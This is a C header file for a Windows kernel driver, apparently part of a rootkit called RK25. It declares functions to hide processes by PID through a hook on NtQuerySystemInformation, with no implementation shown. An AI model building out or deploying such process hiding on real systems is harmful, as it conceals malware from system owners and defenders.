#ifndef _RK25_QUEUE_PROCESS_H_
#define _RK25_QUEUE_PROCESS_H_

#include <ntddk.h>
#include "../../../common/list/rk25_list.h"
#include "../../../common/rk25_def.h"
#include "../../common/hook/ntqsi/rk25_hook_ntqsi.h"

typedef struct _RK25_PROCESS_DATA {
	UCHAR attr;
	HANDLE pid;
} RK25_PROCESS_DATA, RK25_PD, * PRK25_PD;

VOID RK25HideProcessInit();
VOID RK25HideProcessFree();

NTSTATUS RK25HideProcessHook(ULONG attr);

VOID RK25HideProcessAddByPID(IN CONST HANDLE pid);
PRK25_PD RK25HideProcessGetByPID(IN CONST HANDLE pid);
VOID RK25HideProcessDel(IN CONST HANDLE pid);


#endif // !_RK25_QUEUE_PROCESS_H_
